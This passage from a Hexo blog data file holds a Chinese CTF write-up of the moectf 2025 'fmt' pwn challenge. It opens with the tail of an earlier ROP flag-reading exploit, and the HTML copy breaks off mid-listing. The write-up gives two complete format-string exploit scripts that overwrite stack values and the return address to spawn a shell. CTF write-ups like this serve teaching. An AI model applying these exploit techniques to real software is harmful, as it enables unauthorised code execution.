class=\"number\">16</span>)</span><br><span class=\"line\">logv(<span class=\"string\">&quot;libc&quot;</span>,<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">logv(<span class=\"string\">&quot;stack&quot;</span>,<span class=\"built_in\">hex</span>(stack))</span><br><span class=\"line\"></span><br><span class=\"line\">write=libc_base+libc.sym[<span class=\"string\">&quot;write&quot;</span>]</span><br><span class=\"line\"><span class=\"comment\">## gadgets</span></span><br><span class=\"line\">pop_rdi=libc_base + <span class=\"number\">0x2a3e5</span></span><br><span class=\"line\">pop_rsi=libc_base + <span class=\"number\">0x2be51</span></span><br><span class=\"line\">pop_rdx=libc_base + <span class=\"number\">0x11f497</span>  <span class=\"comment\"># pop rdx;pop r12;ret</span></span><br><span class=\"line\">leave_ret=<span class=\"number\">0x401650</span></span><br><span class=\"line\"><span class=\"comment\">## addr </span></span><br><span class=\"line\">ROP=<span class=\"number\">0x4016EC</span></span><br><span class=\"line\">flag=<span class=\"number\">0x4053C0</span></span><br><span class=\"line\">buf=<span class=\"number\">0x405460</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#2 prepare my ROP </span></span><br><span class=\"line\">payload=<span class=\"number\">0x20</span>*<span class=\"string\">b&quot;a&quot;</span>+p64(buf)+p64(<span class=\"number\">0x401ed9</span>)</span><br><span class=\"line\">visit_op(<span class=\"number\">3</span>,payload,<span class=\"number\">0</span>)</span><br><span class=\"line\">leave_op(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#3 orw  flag</span></span><br><span class=\"line\">payload = p64(<span class=\"number\">0</span>)+p64(pop_rdi)+p64(<span class=\"number\">2</span>)</span><br><span class=\"line\">payload+= p64(pop_rsi)+p64(flag)</span><br><span class=\"line\">payload+= p64(pop_rdx)+p64(<span class=\"number\">0x64</span>)+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload+= p64(write)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;well,prepare your rop now!&quot;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#4</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x10</span></span><br><span class=\"line\">payload+= p64(buf) </span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;Enter your flag: &quot;</span>,<span class=\"string\">b&quot;hhhh&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#5</span></span><br><span class=\"line\">io.send(payload) </span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n"},{"title":"moectf-2025-pwn-fmt","cover":"/img/治不开心药.png","_content":"# fmt\n\n## 前言\n\n一个平常的下午，学妹让我帮忙看看题。起初我不以为意，吃完晚饭才开始看。然后就写到了1点钟。感觉自己的思路还是太丑陋，不优雅。于是想起了一个格式化字符串的极限利用。\n[一次有趣的格式化字符串漏洞利用 | ZIKH26's Blog](https://zikh26.github.io/posts/a523e26a.html#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4)\n开始研究\n\n## ida分析\n\n### main函数\n\n![image-20250810223742657](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810223742657.png)\n\n功能非常的简单，\n\n1. 循环3次调用talk，需要控制flag的值（后续再看）\n2. atk判断，成功则调用he()\n\n先看he()里有啥。\n\n### he函数\n\n![image-20250810224024236](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810224024236.png)\n\n这里建议看汇编，\n\n1. system的出现，让人思路开朗\n2. command是`-0xe`，也就是要控制`rbp-0xe`\n3. 注意lea 和 mov 的区别，通过这个方法的话，必须要把\"/bin/sh\"写在栈上\n\n一般揣测一下出题人的想法，肯定是最后要返回到这里了。\n\n### talk函数\n\n![image-20250810224845139](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810224845139.png)\n\n重点来了，\n\n1. 非栈上格式化字符串,每次只读0x20字节\n2. flag初始是0,talk会把它变成1,想办法置0\n3. 返回到了my_read,继续追踪\n\n![image-20250810225109891](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810225109891.png)\n\n看看bss段上,这些变量的位置\n\n![image-20250810225315432](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810225315432.png)\n\natk在flag上面,那么就可以利用my_read把flag设置成0 ,只要每次都输入8字节就可以.\n\n## 思路分析\n\n1.通过格式化字符串去修改command,和返回地址.让程序最后跳转执行,getshell\n2.但是，常规的思路，需要的格式化次数不止3次。\n\n> 1. %p泄露栈地址\n> 2. 把rbp链入（因为此题目栈上无`诸葛连弩`，要自己建）\n> 3. 修改啥也不行，没次数了\n\n3.所以笔者在这里用了一些奇怪的方法。\n\n>1. 笔者开始想，因为`i`也是在栈上的，所以我可以修改`i`来增加次数\n>2. 但是，恰因如此，如果修改rbp，那么会影响下次循环对`i`的判断，\n>3. 于是笔者又注意到栈上有很多0，控制好rbp，其实也是可以的 。\n>4. 所以在笔者的精心的构造下，完成了10次格式化字符串的修改。\n>5. 比较重要的就是两个$n的运用。一个把`sh`写在了栈上,一个把最后修改返回地址前的,rbp-0x4 修改好了.\n\n4.笔者又再反思,可不可以利用格式化字符串的极限,两次把所需的改完.答案是可以.\n\n## exp\n\n### 10次格式化字符串\n\n```python\nfrom esy import *\ncontext.log_level=\"debug\"\n#context.terminal=[\"tmux\",\"splitw\",\"-h\",\"-l\",\"66%\"]\nio,elf=loadfile(\"./pwn\")\n\n\n# 1 leak stack\npayload=b\"%8$p\"\nio.sendafter(\"...\\n\",payload)\nrbp=int(io.recv(14),16)-0x20\n#logv(\"rbp\",hex(rbp))\nrbp_low=rbp & 0xffff\nfmt_low=0x4040c0 & 0xffff\nio.sendafter(\"battle!\",b\"a\"*8)\n\n#2，3 rbp链入,修改rbp \npayload = '%{}c%6$hn'.format(rbp_low).encode()\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n\npayload = '%{}c%47$hn\\x00'.format(rbp_low+0x38).encode()\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n#4,5,6 'sh'写入栈,修改rbp,把rbp+0x3e-4 链入并置0\npayload = '%{}c%8$n\\x00'.format(0x6873).encode() # 1 canshuxieshangl\n\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n\npayload = '%{}c%47$hn'.format(rbp_low+0x58).encode()\npayload+= '%{}c%6$hn\\x00'.format((0x38+0xe-4-0x58+0x10000)%0x10000).encode() # 0\nprint(5)\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n\npayload = '%{}c%47$n\\x00'.format(0x00).format() # 1\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n\n\n######7 把rbp再次链入\npayload = '%{}c%6$hn\\x00'.format(rbp_low).encode()\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n#####8 修改rbp 为rbp_low+0x38+0xe\npayload = '%{}c%47$hn\\x00'.format(rbp_low+0x38+0xe).encode()\npayload = payload.ljust(0x20,b'\\x00')\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\ngdb.attach(io,\"b *0x401332\")\n##### 9 把rbp+8 链入\npayload = '%{}c%6$hn\\x00'.format(rbp_low+8).encode()\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n##### 10 修改返回地址\npayload = '%{}c%47$hn'.format(0x1274).encode()\nprint(len(payload))\npayload +=b'/bin/sh\\x00'\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\nio.interactive()\n\n\n```\n\n### 优雅至极\n\n```python\nfrom esy import *\ncontext.log_level=\"debug\"\n#context.terminal=[\"tmux\",\"splitw\",\"-h\",\"-l\",\"66%\"]\nio,elf=loadfile(\"./pwn\")\ngdb.attach(io,\"b *0x401332\")\n\n# 1 leak stack\npayload=b\"%8$p\"\nio.sendafter(\"...\\n\",payload)\n\nrbp=int(io.recv(14),16)-0x20\n#logv(\"rbp\",hex(rbp))\nrbp_low=rbp & 0xffff\nfmt_low=0x4040c0 & 0xffff\nio.sendafter(\"battle!\",b\"a\"*8)\n\n#2 gouzao \npayload =  b\"%p\" * 4 \npayload += '%{}c%hn'.format(rbp_low+0x20-0x4-40).encode()\npayload+= '%{}c%47$hn'.format((0x6873-(rbp_low+0x20)+0xe)).encode()\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n\n# 3 \npayload = b\"%p\" *4 \npayload+= '%{}c%hn'.format(rbp_low+0x12-40).encode()\npayload+= '%{}c%47$hn'.format((0x1274-(rbp_low+0x38)+0x30+0x10000)%0x10000).encode()\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n\nio.interactive()\n\n```\n\n","source":"_posts/ctf比赛复现/moectf-2025-pwn-fmt.md","raw":"---\ntitle: moectf-2025-pwn-fmt\ntags:\n    - fmt\n    - pwn\ncategories:\n    - 比赛记录\ncover: /img/治不开心药.png\n---\n# fmt\n\n## 前言\n\n一个平常的下午，学妹让我帮忙看看题。起初我不以为意，吃完晚饭才开始看。然后就写到了1点钟。感觉自己的思路还是太丑陋，不优雅。于是想起了一个格式化字符串的极限利用。\n[一次有趣的格式化字符串漏洞利用 | ZIKH26's Blog](https://zikh26.github.io/posts/a523e26a.html#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4)\n开始研究\n\n## ida分析\n\n### main函数\n\n![image-20250810223742657](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810223742657.png)\n\n功能非常的简单，\n\n1. 循环3次调用talk，需要控制flag的值（后续再看）\n2. atk判断，成功则调用he()\n\n先看he()里有啥。\n\n### he函数\n\n![image-20250810224024236](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810224024236.png)\n\n这里建议看汇编，\n\n1. system的出现，让人思路开朗\n2. command是`-0xe`，也就是要控制`rbp-0xe`\n3. 注意lea 和 mov 的区别，通过这个方法的话，必须要把\"/bin/sh\"写在栈上\n\n一般揣测一下出题人的想法，肯定是最后要返回到这里了。\n\n### talk函数\n\n![image-20250810224845139](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810224845139.png)\n\n重点来了，\n\n1. 非栈上格式化字符串,每次只读0x20字节\n2. flag初始是0,talk会把它变成1,想办法置0\n3. 返回到了my_read,继续追踪\n\n![image-20250810225109891](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810225109891.png)\n\n看看bss段上,这些变量的位置\n\n![image-20250810225315432](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810225315432.png)\n\natk在flag上面,那么就可以利用my_read把flag设置成0 ,只要每次都输入8字节就可以.\n\n## 思路分析\n\n1.通过格式化字符串去修改command,和返回地址.让程序最后跳转执行,getshell\n2.但是，常规的思路，需要的格式化次数不止3次。\n\n> 1. %p泄露栈地址\n> 2. 把rbp链入（因为此题目栈上无`诸葛连弩`，要自己建）\n> 3. 修改啥也不行，没次数了\n\n3.所以笔者在这里用了一些奇怪的方法。\n\n>1. 笔者开始想，因为`i`也是在栈上的，所以我可以修改`i`来增加次数\n>2. 但是，恰因如此，如果修改rbp，那么会影响下次循环对`i`的判断，\n>3. 于是笔者又注意到栈上有很多0，控制好rbp，其实也是可以的 。\n>4. 所以在笔者的精心的构造下，完成了10次格式化字符串的修改。\n>5. 比较重要的就是两个$n的运用。一个把`sh`写在了栈上,一个把最后修改返回地址前的,rbp-0x4 修改好了.\n\n4.笔者又再反思,可不可以利用格式化字符串的极限,两次把所需的改完.答案是可以.\n\n## exp\n\n### 10次格式化字符串\n\n```python\nfrom esy import *\ncontext.log_level=\"debug\"\n#context.terminal=[\"tmux\",\"splitw\",\"-h\",\"-l\",\"66%\"]\nio,elf=loadfile(\"./pwn\")\n\n\n# 1 leak stack\npayload=b\"%8$p\"\nio.sendafter(\"...\\n\",payload)\nrbp=int(io.recv(14),16)-0x20\n#logv(\"rbp\",hex(rbp))\nrbp_low=rbp & 0xffff\nfmt_low=0x4040c0 & 0xffff\nio.sendafter(\"battle!\",b\"a\"*8)\n\n#2，3 rbp链入,修改rbp \npayload = '%{}c%6$hn'.format(rbp_low).encode()\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n\npayload = '%{}c%47$hn\\x00'.format(rbp_low+0x38).encode()\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n#4,5,6 'sh'写入栈,修改rbp,把rbp+0x3e-4 链入并置0\npayload = '%{}c%8$n\\x00'.format(0x6873).encode() # 1 canshuxieshangl\n\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n\npayload = '%{}c%47$hn'.format(rbp_low+0x58).encode()\npayload+= '%{}c%6$hn\\x00'.format((0x38+0xe-4-0x58+0x10000)%0x10000).encode() # 0\nprint(5)\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n\npayload = '%{}c%47$n\\x00'.format(0x00).format() # 1\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n\n\n######7 把rbp再次链入\npayload = '%{}c%6$hn\\x00'.format(rbp_low).encode()\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n#####8 修改rbp 为rbp_low+0x38+0xe\npayload = '%{}c%47$hn\\x00'.format(rbp_low+0x38+0xe).encode()\npayload = payload.ljust(0x20,b'\\x00')\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\ngdb.attach(io,\"b *0x401332\")\n##### 9 把rbp+8 链入\npayload = '%{}c%6$hn\\x00'.format(rbp_low+8).encode()\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n##### 10 修改返回地址\npayload = '%{}c%47$hn'.format(0x1274).encode()\nprint(len(payload))\npayload +=b'/bin/sh\\x00'\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\nio.interactive()\n\n\n```\n\n### 优雅至极\n\n```python\nfrom esy import *\ncontext.log_level=\"debug\"\n#context.terminal=[\"tmux\",\"splitw\",\"-h\",\"-l\",\"66%\"]\nio,elf=loadfile(\"./pwn\")\ngdb.attach(io,\"b *0x401332\")\n\n# 1 leak stack\npayload=b\"%8$p\"\nio.sendafter(\"...\\n\",payload)\n\nrbp=int(io.recv(14),16)-0x20\n#logv(\"rbp\",hex(rbp))\nrbp_low=rbp & 0xffff\nfmt_low=0x4040c0 & 0xffff\nio.sendafter(\"battle!\",b\"a\"*8)\n\n#2 gouzao \npayload =  b\"%p\" * 4 \npayload += '%{}c%hn'.format(rbp_low+0x20-0x4-40).encode()\npayload+= '%{}c%47$hn'.format((0x6873-(rbp_low+0x20)+0xe)).encode()\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n\n# 3 \npayload = b\"%p\" *4 \npayload+= '%{}c%hn'.format(rbp_low+0x12-40).encode()\npayload+= '%{}c%47$hn'.format((0x1274-(rbp_low+0x38)+0x30+0x10000)%0x10000).encode()\nio.sendafter(\"...\\n\",payload)\nio.sendafter(\"battle!\",b\"a\"*8)\n\nio.interactive()\n\n```\n\n","slug":"ctf比赛复现/moectf-2025-pwn-fmt","published":1,"date":"2025-10-06T14:48:09.860Z","updated":"2025-10-06T15:19:16.141Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2i3000huomya5iqbr81","content":"<h1 id=\"fmt\"><a href=\"#fmt\" class=\"headerlink\" title=\"fmt\"></a>fmt</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>一个平常的下午，学妹让我帮忙看看题。起初我不以为意，吃完晚饭才开始看。然后就写到了1点钟。感觉自己的思路还是太丑陋，不优雅。于是想起了一个格式化字符串的极限利用。<br><a href=\"https://zikh26.github.io/posts/a523e26a.html#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4\">一次有趣的格式化字符串漏洞利用 | ZIKH26’s Blog</a><br>开始研究</p>\n<h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"main函数\"><a href=\"#main函数\" class=\"headerlink\" title=\"main函数\"></a>main函数</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810223742657.png\" alt=\"image-20250810223742657\"></p>\n<p>功能非常的简单，</p>\n<ol>\n<li>循环3次调用talk，需要控制flag的值（后续再看）</li>\n<li>atk判断，成功则调用he()</li>\n</ol>\n<p>先看he()里有啥。</p>\n<h3 id=\"he函数\"><a href=\"#he函数\" class=\"headerlink\" title=\"he函数\"></a>he函数</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810224024236.png\" alt=\"image-20250810224024236\"></p>\n<p>这里建议看汇编，</p>\n<ol>\n<li>system的出现，让人思路开朗</li>\n<li>command是<code>-0xe</code>，也就是要控制<code>rbp-0xe</code></li>\n<li>注意lea 和 mov 的区别，通过这个方法的话，必须要把”&#x2F;bin&#x2F;sh”写在栈上</li>\n</ol>\n<p>一般揣测一下出题人的想法，肯定是最后要返回到这里了。</p>\n<h3 id=\"talk函数\"><a href=\"#talk函数\" class=\"headerlink\" title=\"talk函数\"></a>talk函数</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810224845139.png\" alt=\"image-20250810224845139\"></p>\n<p>重点来了，</p>\n<ol>\n<li>非栈上格式化字符串,每次只读0x20字节</li>\n<li>flag初始是0,talk会把它变成1,想办法置0</li>\n<li>返回到了my_read,继续追踪</li>\n</ol>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810225109891.png\" alt=\"image-20250810225109891\"></p>\n<p>看看bss段上,这些变量的位置</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810225315432.png\" alt=\"image-20250810225315432\"></p>\n<p>atk在flag上面,那么就可以利用my_read把flag设置成0 ,只要每次都输入8字节就可以.</p>\n<h2 id=\"思路分析\"><a href=\"#思路分析\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h2><p>1.通过格式化字符串去修改command,和返回地址.让程序最后跳转执行,getshell<br>2.但是，常规的思路，需要的格式化次数不止3次。</p>\n<blockquote>\n<ol>\n<li>%p泄露栈地址</li>\n<li>把rbp链入（因为此题目栈上无<code>诸葛连弩</code>，要自己建）</li>\n<li>修改啥也不行，没次数了</li>\n</ol>\n</blockquote>\n<p>3.所以笔者在这里用了一些奇怪的方法。</p>\n<blockquote>\n<ol>\n<li>笔者开始想，因为<code>i</code>也是在栈上的，所以我可以修改<code>i</code>来增加次数</li>\n<li>但是，恰因如此，如果修改rbp，那么会影响下次循环对<code>i</code>的判断，</li>\n<li>于是笔者又注意到栈上有很多0，控制好rbp，其实也是可以的 。</li>\n<li>所以在笔者的精心的构造下，完成了10次格式化字符串的修改。</li>\n<li>比较重要的就是两个$n的运用。一个把<code>sh</code>写在了栈上,一个把最后修改返回地址前的,rbp-0x4 修改好了.</li>\n</ol>\n</blockquote>\n<p>4.笔者又再反思,可不可以利用格式化字符串的极限,两次把所需的改完.答案是可以.</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"10次格式化字符串\"><a href=\"#10次格式化字符串\" class=\"headerlink\" title=\"10次格式化字符串\"></a>10次格式化字符串</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;,&quot;-l&quot;,&quot;66%&quot;]</span></span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1 leak stack</span></span><br><span class=\"line\">payload=<span class=\"string\">b&quot;%8$p&quot;</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">rbp=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)-<span class=\"number\">0x20</span></span><br><span class=\"line\"><span class=\"comment\">#logv(&quot;rbp&quot;,hex(rbp))</span></span><br><span class=\"line\">rbp_low=rbp &amp; <span class=\"number\">0xffff</span></span><br><span class=\"line\">fmt_low=<span class=\"number\">0x4040c0</span> &amp; <span class=\"number\">0xffff</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#2，3 rbp链入,修改rbp </span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%6$hn&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low).encode()</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%47$hn\\x00&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low+<span class=\"number\">0x38</span>).encode()</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"><span class=\"comment\">#4,5,6 &#x27;sh&#x27;写入栈,修改rbp,把rbp+0x3e-4 链入并置0</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%8$n\\x00&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"number\">0x6873</span>).encode() <span class=\"comment\"># 1 canshuxieshangl</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%47$hn&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low+<span class=\"number\">0x58</span>).encode()</span><br><span class=\"line\">payload+= <span class=\"string\">&#x27;%&#123;&#125;c%6$hn\\x00&#x27;</span>.<span class=\"built_in\">format</span>((<span class=\"number\">0x38</span>+<span class=\"number\">0xe</span>-<span class=\"number\">4</span>-<span class=\"number\">0x58</span>+<span class=\"number\">0x10000</span>)%<span class=\"number\">0x10000</span>).encode() <span class=\"comment\"># 0</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"number\">5</span>)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%47$n\\x00&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"number\">0x00</span>).<span class=\"built_in\">format</span>() <span class=\"comment\"># 1</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">######7 把rbp再次链入</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%6$hn\\x00&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low).encode()</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"><span class=\"comment\">#####8 修改rbp 为rbp_low+0x38+0xe</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%47$hn\\x00&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low+<span class=\"number\">0x38</span>+<span class=\"number\">0xe</span>).encode()</span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;b *0x401332&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">##### 9 把rbp+8 链入</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%6$hn\\x00&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low+<span class=\"number\">8</span>).encode()</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"><span class=\"comment\">##### 10 修改返回地址</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%47$hn&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"number\">0x1274</span>).encode()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(payload))</span><br><span class=\"line\">payload +=<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"优雅至极\"><a href=\"#优雅至极\" class=\"headerlink\" title=\"优雅至极\"></a>优雅至极</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span 